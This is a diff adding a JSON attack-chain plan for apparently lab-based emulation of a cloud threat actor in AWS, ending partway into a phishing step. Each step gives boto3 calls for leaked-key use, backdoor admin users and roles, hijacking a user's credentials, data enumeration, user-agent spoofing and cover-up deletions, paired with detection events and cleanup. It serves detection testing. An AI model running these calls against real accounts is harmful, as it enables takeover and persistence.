@@ -1,0 +1,720 @@
+{
+  "status": "PHASE_3_COMPLETE",
+  "attack_chain": [
+    {
+      "step": 1,
+      "phase": 1,
+      "technique_id": "T1078.004",
+      "technique_name": "Valid Accounts: Cloud Accounts",
+      "tactic": "Initial Access",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-exposed-admin-user",
+      "description": "Bootstrap the attack session using the leaked long-term IAM access key for lab-infra-admin extracted from the terraform.tfstate object in dangerdev-leaked-creds-bucket. Verify identity and confirm AdministratorAccess without calling GetCallerIdentity (per DangerDev opsec pattern).",
+      "implementation": {
+        "method": "boto3.Session initialized with LEAKED_KEY_ID and LEAKED_SECRET_KEY from environment; call iam:GetUser and iam:ListAttachedUserPolicies to confirm admin scope",
+        "credential_source": "leaked_admin_key",
+        "api_calls": [
+          {"service": "iam", "method": "get_user", "args": {}},
+          {"service": "iam", "method": "list_attached_user_policies", "args": {"UserName": "lab-infra-admin"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "GetUser", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "ListAttachedUserPolicies", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["iam:UpdateAccessKey + iam:DeleteAccessKey on lab-infra-admin key — done in cleanup_manifest post-emulation"],
+      "operational_tempo": {"delay_after_seconds": [3, 8]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "GetUser + ListAttachedUserPolicies without preceding GetCallerIdentity (DangerDev evasion fingerprint)",
+        "API calls from non-corporate IP to IAM global endpoint",
+        "GuardDuty: UnauthorizedAccess:IAMUser/MaliciousIPCaller"
+      ]
+    },
+    {
+      "step": 2,
+      "phase": 1,
+      "technique_id": "T1526",
+      "technique_name": "Cloud Service Discovery",
+      "tactic": "Discovery",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-ses-email-identity",
+      "description": "Enumerate SES sending quota and registered identities using the leaked admin key to assess the account's phishing/spam capacity before committing to persistence.",
+      "implementation": {
+        "method": "boto3 SES client (us-east-1) using leaked_admin_key session",
+        "credential_source": "leaked_admin_key",
+        "api_calls": [
+          {"service": "ses", "method": "get_send_quota", "args": {}},
+          {"service": "ses", "method": "list_identities", "args": {"IdentityType": "Domain"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "GetSendQuota", "eventSource": "ses.amazonaws.com"},
+        {"eventName": "ListIdentities", "eventSource": "ses.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["Read-only — no cleanup required"],
+      "operational_tempo": {"delay_after_seconds": [2, 5]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "SES enumeration from anomalous IAM principal",
+        "Automated API cadence (activity repeated on two separate days two weeks apart per TI)",
+        "GuardDuty: Discovery:IAMUser/AnomalousBehavior"
+      ]
+    },
+    {
+      "step": 3,
+      "phase": 1,
+      "technique_id": "T1087.004",
+      "technique_name": "Account Discovery: Cloud Account",
+      "tactic": "Discovery",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-exposed-admin-user",
+      "description": "List all IAM users to map existing accounts for targeting, identify ses-smtp-user naming patterns to inform masquerade design, and spot accounts suitable for access key hijacking (alice.chen).",
+      "implementation": {
+        "method": "boto3 IAM client using leaked_admin_key session; store returned username list for masquerade naming and T1098 targeting",
+        "credential_source": "leaked_admin_key",
+        "api_calls": [
+          {"service": "iam", "method": "list_users", "args": {}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "ListUsers", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["Read-only — no cleanup required"],
+      "operational_tempo": {"delay_after_seconds": [1, 4]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "IAM enumeration burst from leaked credential",
+        "ListUsers cadence consistent with automated recon tooling",
+        "GuardDuty: Discovery:IAMUser/AnomalousBehavior"
+      ]
+    },
+    {
+      "step": 4,
+      "phase": 1,
+      "technique_id": "T1136.003",
+      "technique_name": "Create Account: Cloud Account",
+      "tactic": "Persistence",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-exposed-admin-user",
+      "description": "Create IAM user DangerDev@protonmail.me with a console login profile and long-term access key, establishing an independent persistent channel separate from the originally leaked credential. The returned access key is captured as dangerdev_user_key for all subsequent phases.",
+      "implementation": {
+        "method": "boto3 IAM client using leaked_admin_key session; capture CreateAccessKey response and store as dangerdev_session credentials in CredentialStore",
+        "credential_source": "leaked_admin_key",
+        "api_calls": [
+          {"service": "iam", "method": "create_user", "args": {"UserName": "DangerDev@protonmail.me"}},
+          {"service": "iam", "method": "create_login_profile", "args": {"UserName": "DangerDev@protonmail.me", "Password": "Temp@12345!Lab", "PasswordResetRequired": false}},
+          {"service": "iam", "method": "create_access_key", "args": {"UserName": "DangerDev@protonmail.me"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "CreateUser", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "CreateLoginProfile", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "CreateAccessKey", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["iam:DeleteAccessKey, iam:DeleteLoginProfile, iam:DeleteUser for DangerDev@protonmail.me — executed in T1070 step 15"],
+      "operational_tempo": {"delay_after_seconds": [2, 6]},
+      "risk_level": "high",
+      "iocs_generated": [
+        "Email-format IAM username (DangerDev@protonmail.me) — immediately anomalous",
+        "New IAM user created from anomalous source IP",
+        "GuardDuty: Persistence:IAMUser/UserPermissions"
+      ]
+    },
+    {
+      "step": 5,
+      "phase": 1,
+      "technique_id": "T1098.003",
+      "technique_name": "Account Manipulation: Additional Cloud Roles",
+      "tactic": "Privilege Escalation",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-exposed-admin-user",
+      "description": "Attach AWS-managed AdministratorAccess policy to DangerDev@protonmail.me. All subsequent API calls pivot to dangerdev_user_key to distance attack activity from the originally leaked credential.",
+      "implementation": {
+        "method": "boto3 IAM client using leaked_admin_key session for this final call; CredentialStore switches active session to dangerdev_session after this step",
+        "credential_source": "leaked_admin_key",
+        "api_calls": [
+          {"service": "iam", "method": "attach_user_policy", "args": {"UserName": "DangerDev@protonmail.me", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "AttachUserPolicy", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["iam:DetachUserPolicy removes AdministratorAccess before user deletion in T1070 step 15"],
+      "operational_tempo": {"delay_after_seconds": [4, 10]},
+      "risk_level": "high",
+      "iocs_generated": [
+        "AdministratorAccess attached to newly created non-service IAM user",
+        "GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions",
+        "AWS Security Hub: IAM.1 — root or admin-equivalent user with active keys"
+      ]
+    },
+    {
+      "step": 6,
+      "phase": 2,
+      "technique_id": "T1580",
+      "technique_name": "Cloud Infrastructure Discovery",
+      "tactic": "Discovery",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-sandbox-vpc",
+      "description": "Enumerate EC2 regions, running instances, existing security groups, VPCs, and available GPU instance types using DangerDev credentials to survey compute and network capacity before launching mining infrastructure.",
+      "implementation": {
+        "method": "boto3 EC2 client (us-east-1) using dangerdev_user_key session",
+        "credential_source": "dangerdev_user_key",
+        "api_calls": [
+          {"service": "ec2", "method": "describe_regions", "args": {}},
+          {"service": "ec2", "method": "describe_instances", "args": {}},
+          {"service": "ec2", "method": "describe_security_groups", "args": {}},
+          {"service": "ec2", "method": "describe_vpcs", "args": {}},
+          {"service": "ec2", "method": "describe_instance_types", "args": {"Filters": [{"Name": "instance-type", "Values": ["p3.*", "p4d.*", "g4dn.*"]}]}},
+          {"service": "ec2", "method": "describe_availability_zones", "args": {}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "DescribeRegions", "eventSource": "ec2.amazonaws.com"},
+        {"eventName": "DescribeInstances", "eventSource": "ec2.amazonaws.com"},
+        {"eventName": "DescribeSecurityGroups", "eventSource": "ec2.amazonaws.com"},
+        {"eventName": "DescribeVpcs", "eventSource": "ec2.amazonaws.com"},
+        {"eventName": "DescribeInstanceTypes", "eventSource": "ec2.amazonaws.com"},
+        {"eventName": "DescribeAvailabilityZones", "eventSource": "ec2.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["Read-only — no cleanup required"],
+      "operational_tempo": {"delay_after_seconds": [2, 6]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "Broad EC2 enumeration burst from new IAM user (DangerDev@protonmail.me)",
+        "GPU instance type filter (p3.*, p4d.*, g4dn.*) — mining candidate reconnaissance",
+        "GuardDuty: Discovery:EC2/AnomalousBehavior"
+      ]
+    },
+    {
+      "step": 7,
+      "phase": 2,
+      "technique_id": "T1578.002",
+      "technique_name": "Modify Cloud Compute Infrastructure: Create Cloud Instance",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-ec2-windows-instance",
+      "description": "Launch a t2.micro Windows test instance into the pre-provisioned dangerdev-open-sg security group to validate instance lifecycle before GPU deployment. Terminate the test instance after confirming successful launch. The Pulumi-managed dangerdev-ec2-windows-instance serves as the persistent RDP attack surface; this step emulates DangerDev's t2.micro test-before-GPU pattern.",
+      "implementation": {
+        "method": "boto3 EC2 client using dangerdev_user_key session; resolve latest Windows Server 2022 AMI via SSM parameter, run instance, wait for running state, then terminate",
+        "credential_source": "dangerdev_user_key",
+        "api_calls": [
+          {"service": "ssm", "method": "get_parameter", "args": {"Name": "/aws/service/ami-windows-latest/Windows_Server-2022-English-Full-Base", "WithDecryption": false}},
+          {"service": "ec2", "method": "run_instances", "args": {
+            "ImageId": "<resolved-ami-id>",
+            "InstanceType": "t2.micro",
+            "MinCount": 1,
+            "MaxCount": 1,
+            "KeyName": "dangerdev-lab-key",
+            "SecurityGroupIds": ["<dangerdev-open-sg-id>"],
+            "SubnetId": "<dangerdev-public-subnet-id>",
+            "TagSpecifications": [{"ResourceType": "instance", "Tags": [{"Key": "Name", "Value": "dangerdev-test-instance"}, {"Key": "MayaTrail", "Value": "true"}]}]
+          }},
+          {"service": "ec2", "method": "describe_instance_status", "args": {"InstanceIds": ["<launched-instance-id>"], "IncludeAllInstances": true}},
+          {"service": "ec2", "method": "terminate_instances", "args": {"InstanceIds": ["<launched-instance-id>"]}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "GetParameter", "eventSource": "ssm.amazonaws.com"},
+        {"eventName": "RunInstances", "eventSource": "ec2.amazonaws.com"},
+        {"eventName": "DescribeInstanceStatus", "eventSource": "ec2.amazonaws.com"},
+        {"eventName": "TerminateInstances", "eventSource": "ec2.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM", "VPC Flow Logs"],
+      "cleanup_actions": ["ec2:TerminateInstances called within this step — test instance terminated before proceeding"],
+      "operational_tempo": {"delay_after_seconds": [30, 60]},
+      "risk_level": "medium",
+      "iocs_generated": [
+        "EC2 instance launched by anomalous IAM user (DangerDev@protonmail.me)",
+        "RunInstances with security group allowing 0.0.0.0/0 on 3389 and 22",
+        "AWS Security Hub: EC2.19 — security group allows unrestricted inbound access",
+        "GuardDuty: Backdoor:EC2/C&CActivity (security group pattern)"
+      ]
+    },
+    {
+      "step": 8,
+      "phase": 2,
+      "technique_id": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "tactic": "Lateral Movement",
+      "execution_context": "lateral_movement",
+      "target_resource": "dangerdev-ec2-windows-instance",
+      "description": "Simulate RDP access to the Pulumi-managed dangerdev-ec2-windows-instance (port 3389 open to 0.0.0.0/0). The attack script performs a TCP SYN probe to port 3389 to confirm reachability and generate VPC Flow Log evidence. No actual RDP handshake or interactive session is established.",
+      "implementation": {
+        "method": "Resolve EC2 public IP via ec2:DescribeInstances on dangerdev-ec2-windows-instance, then Python socket.connect_ex((public_ip, 3389), timeout=5). Log OPEN/CLOSED. No RDP client library invoked.",
+        "credential_source": "dangerdev_user_key",
+        "api_calls": [
+          {"service": "ec2", "method": "describe_instances", "args": {"Filters": [{"Name": "tag:Name", "Values": ["dangerdev-ec2-windows-instance"]}]}}
+        ],
+        "details": "TCP probe is pure Python socket — not a boto3 API call. VPC Flow Logs capture ACCEPT record for the SYN packet on port 3389."
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["VPC Flow Logs", "IDS", "SIEM"],
+      "cleanup_actions": ["TCP probe is stateless — no resources created; VPC Flow Log records are read-only artifacts"],
+      "operational_tempo": {"delay_after_seconds": [5, 15]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "TCP SYN to port 3389 on EC2 public IP — ACCEPT record in VPC Flow Logs",
+        "Inbound connection on RDP port from non-corporate foreign IP",
+        "GuardDuty: UnauthorizedAccess:EC2/RDPBruteForce (if repeated)"
+      ]
+    },
+    {
+      "step": 9,
+      "phase": 2,
+      "technique_id": "T1496",
+      "technique_name": "Resource Hijacking",
+      "tactic": "Impact",
+      "execution_context": "host_attack",
+      "target_resource": "dangerdev-ec2-windows-instance",
+      "description": "USERDATA ONLY — Benign CPU-bound workload runs at instance boot via UserData PowerShell on dangerdev-ec2-windows-instance, simulating cryptomining process lifecycle. Attack script does NOT implement this step — it runs automatically at EC2 launch. GPU instances (p3.16xlarge) excluded per cannot_safely_emulate constraint; t2.micro substituted.",
+      "implementation": {
+        "method": "UserData PowerShell on dangerdev-ec2-windows-instance (see userdata_actions in infra plan). 5-minute Math.Sqrt CPU loop then EventLog write. Not called by attack.py.",
+        "details": "Observable via CloudWatch CPUUtilization spike on dangerdev-ec2-windows-instance and Windows Application EventLog EventId 9999 from source 'Application'. No real mining binary installed or executed."
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": ["GuardDuty", "CloudWatch Metrics", "VPC Flow Logs"],
+      "cleanup_actions": ["Workload self-terminates after 5 minutes; no persistent resources created by UserData script"],
+      "operational_tempo": {"delay_after_seconds": [10, 20]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "CPU spike on EC2 instance at launch (CloudWatch CPUUtilization)",
+        "Windows Application EventLog EventId 9999 — T1496 simulation marker",
+        "GuardDuty: CryptoCurrency:EC2/BitcoinTool.B (simulated via CPU pattern)"
+      ]
+    },
+    {
+      "step": 10,
+      "phase": 3,
+      "technique_id": "T1036.005",
+      "technique_name": "Masquerading: Match Legitimate Name or Location",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-cross-account-backdoor-role",
+      "description": "Create IAM user 'ses' to blend with ses-smtp-user.* auto-generated SMTP credential accounts. List and inspect the two pre-provisioned backdoor roles (AWSeservedSSO_AdminAccess and AWSLanding-Zones-ConfigRecorderRoles) to verify masquerade naming is present in the account. Capture ses user access key as ses_user_key.",
+      "implementation": {
+        "method": "boto3 IAM client using dangerdev_user_key session",
+        "credential_source": "dangerdev_user_key",
+        "api_calls": [
+          {"service": "iam", "method": "create_user", "args": {"UserName": "ses"}},
+          {"service": "iam", "method": "create_access_key", "args": {"UserName": "ses"}},
+          {"service": "iam", "method": "list_roles", "args": {"PathPrefix": "/"}},
+          {"service": "iam", "method": "get_role", "args": {"RoleName": "AWSeservedSSO_AdminAccess"}},
+          {"service": "iam", "method": "get_role", "args": {"RoleName": "AWSLanding-Zones-ConfigRecorderRoles"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "CreateUser", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "CreateAccessKey", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "ListRoles", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "GetRole", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["iam:DeleteAccessKey for ses user key, iam:DeleteUser for ses — executed in T1070 step 15"],
+      "operational_tempo": {"delay_after_seconds": [2, 6]},
+      "risk_level": "high",
+      "iocs_generated": [
+        "IAM username 'ses' — single-word, matches SES service name, designed to blend with ses-smtp-user.* pattern",
+        "AWSeservedSSO_AdminAccess present in account (lowercase 'e' vs legitimate AWSReservedSSO_ prefix — one character diff)",
+        "AWSLanding-Zones-ConfigRecorderRoles with AdministratorAccess (mismatched policy for a Config recorder role)",
+        "AWS Security Hub: IAM.1"
+      ]
+    },
+    {
+      "step": 11,
+      "phase": 3,
+      "technique_id": "T1199",
+      "technique_name": "Trusted Relationship",
+      "tactic": "Initial Access",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-cross-account-backdoor-role",
+      "description": "Attach AdministratorAccess to both pre-provisioned cross-account backdoor roles and attempt sts:AssumeRole to verify trust policy is live. AssumeRole is expected to return AccessDenied when invoked from the victim account (not the adversary account) — this is documented as EXPECTED_FAILURE confirming the cross-account trust is correctly wired.",
+      "implementation": {
+        "method": "boto3 IAM and STS clients using dangerdev_user_key session; catch ClientError code=AccessDenied on AssumeRole and log as EXPECTED_FAILURE",
+        "credential_source": "dangerdev_user_key",
+        "api_calls": [
+          {"service": "iam", "method": "attach_role_policy", "args": {"RoleName": "AWSeservedSSO_AdminAccess", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}},
+          {"service": "iam", "method": "attach_role_policy", "args": {"RoleName": "AWSLanding-Zones-ConfigRecorderRoles", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}},
+          {"service": "sts", "method": "assume_role", "args": {"RoleArn": "arn:aws:iam::<ACCOUNT_ID>:role/AWSeservedSSO_AdminAccess", "RoleSessionName": "dangerdev-backdoor-verify"}}
+        ],
+        "notes": "AttachRolePolicy is idempotent — safe to call on Pulumi-managed roles that already have the policy. sts:AssumeRole from victim account returns AccessDenied (expected) because trust policy requires arn:aws:iam::ADVERSARY_LAB_ACCOUNT_ID:root principal. Script catches botocore.exceptions.ClientError where response['Error']['Code'] == 'AccessDenied' and records EXPECTED_FAILURE with CloudTrail eventName=AssumeRole for detection validation."
+      },
+      "expected_audit_events": [
+        {"eventName": "AttachRolePolicy", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "AssumeRole", "eventSource": "sts.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["iam:DetachRolePolicy for both roles (AWSeservedSSO_AdminAccess and AWSLanding-Zones-ConfigRecorderRoles) — done in cleanup_manifest before pulumi destroy"],
+      "operational_tempo": {"delay_after_seconds": [3, 8]},
+      "risk_level": "high",
+      "iocs_generated": [
+        "Cross-account trust role with AdministratorAccess attached — backdoor survives user deletion",
+        "AssumeRole attempt logged in CloudTrail even on AccessDenied",
+        "GuardDuty: Persistence:IAMUser/UserPermissions",
+        "GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions"
+      ]
+    },
+    {
+      "step": 12,
+      "phase": 3,
+      "technique_id": "T1098",
+      "technique_name": "Account Manipulation",
+      "tactic": "Persistence",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-decoy-user-alice",
+      "description": "Create a second access key on existing victim account alice.chen and reset her console password via UpdateLoginProfile. This ensures persistent access after DangerDev@protonmail.me is deleted — the hijacked alice.chen credentials survive the T1070 cleanup. Captures alice_hijacked_key for documentation.",
+      "implementation": {
+        "method": "boto3 IAM client using dangerdev_user_key session; capture CreateAccessKey response as alice_hijacked_session in CredentialStore",
+        "credential_source": "dangerdev_user_key",
+        "api_calls": [
+          {"service": "iam", "method": "create_access_key", "args": {"UserName": "alice.chen"}},
+          {"service": "iam", "method": "update_login_profile", "args": {"UserName": "alice.chen", "Password": "Pwn3d@Lab!999", "PasswordResetRequired": false}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "CreateAccessKey", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "UpdateLoginProfile", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["iam:DeleteAccessKey for alice.chen TA-created key — done in cleanup_manifest; iam:UpdateLoginProfile to restore alice.chen password to ChangeMe2024!"],
+      "operational_tempo": {"delay_after_seconds": [2, 5]},
+      "risk_level": "high",
+      "iocs_generated": [
+        "alice.chen now has 2 active access keys — Security Hub IAM.3",
+        "Password reset on alice.chen performed by DangerDev@protonmail.me session (cross-user manipulation)",
+        "GuardDuty: Persistence:IAMUser/UserPermissions"
+      ]
+    },
+    {
+      "step": 13,
+      "phase": 3,
+      "technique_id": "T1530",
+      "technique_name": "Data from Cloud Storage",
+      "tactic": "Collection",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-sensitive-s3-bucket",
+      "description": "Enumerate all S3 buckets and list objects in dangerdev-prod-data-archive to confirm presence of sensitive-looking files (customers/export_2024_q4.csv, backups/db_dump_prod.sql.gz). Also enumerate IAM instance profiles and alice.chen SSH keys — matches DangerDev's observed enumeration cluster.",
+      "implementation": {
+        "method": "boto3 S3 and IAM clients using dangerdev_user_key session",
+        "credential_source": "dangerdev_user_key",
+        "api_calls": [
+          {"service": "s3", "method": "list_buckets", "args": {}},
+          {"service": "s3", "method": "list_objects_v2", "args": {"Bucket": "dangerdev-prod-data-archive-<ACCOUNT_ID>", "MaxKeys": 100}},
+          {"service": "iam", "method": "list_instance_profiles", "args": {}},
+          {"service": "iam", "method": "list_groups_for_user", "args": {"UserName": "DangerDev@protonmail.me"}},
+          {"service": "iam", "method": "list_ssh_public_keys", "args": {"UserName": "alice.chen"}}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "ListBuckets", "eventSource": "s3.amazonaws.com"},
+        {"eventName": "ListObjects", "eventSource": "s3.amazonaws.com"},
+        {"eventName": "ListInstanceProfiles", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "ListGroupsForUser", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "ListSSHPublicKeys", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["Read-only — no cleanup required"],
+      "operational_tempo": {"delay_after_seconds": [2, 6]},
+      "risk_level": "medium",
+      "iocs_generated": [
+        "S3 bucket enumeration from anomalous IAM user",
+        "GuardDuty: Discovery:S3/AnomalousBehavior",
+        "GuardDuty: Discovery:S3/MaliciousIPCaller",
+        "S3 data event (ListObjects) on dangerdev-prod-data-archive in CloudTrail"
+      ]
+    },
+    {
+      "step": 14,
+      "phase": 3,
+      "technique_id": "T1518.001",
+      "technique_name": "Software Discovery: Security Software Discovery",
+      "tactic": "Discovery",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-guardduty-detector",
+      "description": "Review active GuardDuty findings to assess detection exposure before initiating cleanup. Use SimulatePrincipalPolicy to probe SSM and Secrets Manager permissions without calling those services directly — avoids triggering SSM/SecretsManager-specific detection while still probing access scope. Mirrors DangerDev's use of RDS console user-agent for GuardDuty access.",
+      "implementation": {
+        "method": "boto3 GuardDuty and IAM clients using dangerdev_user_key session; set User-Agent to anomalous value via botocore event_system to replicate DangerDev's RDS console user-agent fingerprint",
+        "credential_source": "dangerdev_user_key",
+        "api_calls": [
+          {"service": "guardduty", "method": "list_detectors", "args": {}},
+          {"service": "guardduty", "method": "list_findings", "args": {"DetectorId": "<detector-id>", "FindingCriteria": {"Criterion": {"severity": {"Gte": 4}}}}},
+          {"service": "guardduty", "method": "get_findings", "args": {"DetectorId": "<detector-id>", "FindingIds": ["<finding-ids-from-list>"]}},
+          {"service": "iam", "method": "simulate_principal_policy", "args": {
+            "PolicySourceArn": "arn:aws:iam::<ACCOUNT_ID>:user/DangerDev@protonmail.me",
+            "ActionNames": ["ssm:GetParameter", "ssm:DescribeParameters", "secretsmanager:GetSecretValue", "secretsmanager:ListSecrets"],
+            "ResourceArns": ["*"]
+          }}
+        ]
+      },
+      "expected_audit_events": [
+        {"eventName": "ListDetectors", "eventSource": "guardduty.amazonaws.com"},
+        {"eventName": "ListFindings", "eventSource": "guardduty.amazonaws.com"},
+        {"eventName": "GetFindings", "eventSource": "guardduty.amazonaws.com"},
+        {"eventName": "SimulatePrincipalPolicy", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["Read-only — no cleanup required"],
+      "operational_tempo": {"delay_after_seconds": [2, 6]},
+      "risk_level": "medium",
+      "iocs_generated": [
+        "GuardDuty API access from anomalous IAM principal with anomalous user-agent",
+        "SimulatePrincipalPolicy probing SSM and Secrets Manager — permission check without service telemetry",
+        "SIEM alert: iam:SimulatePrincipalPolicy targeting sensitive service actions from non-ops principal"
+      ]
+    },
+    {
+      "step": 15,
+      "phase": 3,
+      "technique_id": "T1070",
+      "technique_name": "Indicator Removal",
+      "tactic": "Defense Evasion",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-exposed-admin-user",
+      "description": "Delete all DangerDev@protonmail.me and ses user artifacts (access keys, login profiles, policy attachments, users) to erase visible attack footprint — mirrors DangerDev's observed self-cleanup pattern. Script switches to lab_operator_key (LAB_OPERATOR_KEY env var) for final iam:DeleteUser on DangerDev@protonmail.me since an IAM user's own session cannot delete the user account while it holds active credentials.",
+      "implementation": {
+        "method": "boto3 IAM client; first uses dangerdev_user_key for ses cleanup, then switches to LAB_OPERATOR_KEY boto3 session for DangerDev self-deletion",
+        "credential_source": "dangerdev_user_key",
+        "api_calls": [
+          {"service": "iam", "method": "update_access_key", "args": {"UserName": "ses", "AccessKeyId": "<ses-key-id>", "Status": "Inactive"}},
+          {"service": "iam", "method": "delete_access_key", "args": {"UserName": "ses", "AccessKeyId": "<ses-key-id>"}},
+          {"service": "iam", "method": "delete_user", "args": {"UserName": "ses"}},
+          {"service": "iam", "method": "detach_user_policy", "args": {"UserName": "DangerDev@protonmail.me", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}},
+          {"service": "iam", "method": "delete_access_key", "args": {"UserName": "DangerDev@protonmail.me", "AccessKeyId": "<dangerdev-key-id>"}},
+          {"service": "iam", "method": "delete_login_profile", "args": {"UserName": "DangerDev@protonmail.me"}},
+          {"service": "iam", "method": "delete_user", "args": {"UserName": "DangerDev@protonmail.me"}}
+        ],
+        "notes": "Last three calls (DetachUserPolicy, DeleteAccessKey, DeleteLoginProfile, DeleteUser on DangerDev@protonmail.me) use LAB_OPERATOR_KEY session. CredentialStore marks dangerdev_session as invalidated after delete_user succeeds."
+      },
+      "expected_audit_events": [
+        {"eventName": "UpdateAccessKey", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "DeleteAccessKey", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "DeleteUser", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "DetachUserPolicy", "eventSource": "iam.amazonaws.com"},
+        {"eventName": "DeleteLoginProfile", "eventSource": "iam.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["All DangerDev@protonmail.me and ses artifacts deleted within this step — no further cleanup needed for these resources"],
+      "operational_tempo": {"delay_after_seconds": [2, 6]},
+      "risk_level": "medium",
+      "iocs_generated": [
+        "High-frequency IAM deletion burst (DeleteUser + DeleteAccessKey + DetachUserPolicy in rapid succession)",
+        "DangerDev@protonmail.me self-cleanup — cover-up attempt is itself a forensic indicator",
+        "SIEM: successive DeleteUser + DetachUserPolicy events from same session",
+        "CloudTrail deletions are fully logged — cover-up fails to erase CloudTrail history"
+      ]
+    },
+    {
+      "step": 16,
+      "phase": 3,
+      "technique_id": "T1583.001",
+      "technique_name": "Acquire Infrastructure: Domains",
+      "tactic": "Resource Development",
+      "execution_context": "api_attack",
+      "target_resource": "dangerdev-ses-email-identity",
+      "description": "DOCUMENTED ONLY — Cannot safely emulate: route53domains:RegisterDomain creates real internet-facing infrastructure with billing and legal implications. Attack script logs the CloudTrail-equivalent event structure for RegisterDomain without executing the API call. In the real DangerDev incident, four PayPal-mimicking domains were registered for credential harvesting.",
+      "implementation": {
+        "method": "SIMULATED: Script prints structured JSON matching CloudTrail RegisterDomain event format; no boto3 API call is made",
+        "credential_source": "alice_hijacked_key",
+        "api_calls": [],
+        "simulated_call": {
+          "service": "route53domains",
+          "method": "register_domain",
+          "args": {"DomainName": "[REDACTED — PayPal-mimicking domain]", "DurationInYears": 1, "AutoRenew": false, "PrivacyProtectRegistrantContact": true}
+        }
+      },
+      "expected_audit_events": [
+        {"eventName": "RegisterDomain", "eventSource": "route53domains.amazonaws.com"}
+      ],
+      "audit_visible": true,
+      "detection_sources": ["CloudTrail", "SIEM"],
+      "cleanup_actions": ["No API call executed — no cleanup required"],
+      "operational_tempo": {"delay_after_seconds": [1, 3]},
+      "risk_level": "low",
+      "iocs_generated": [
+        "route53domains:RegisterDomain from anomalous principal (simulated in script output only)",
+        "AWS billing alert on unexpected Route53 domain charges (would trigger in live execution)"
+      ]
+    },
+    {
+      "step": 17,
+      "phase": 3,
+      "technique_id": "T1566.002",
+      "technique_name": "Phishing: Spearphishing Link",
+      "tactic": "Initial Access",
+      "execution_context": "phishing_attack",
+      "target_resource": "dangerdev-ses-email-identity",
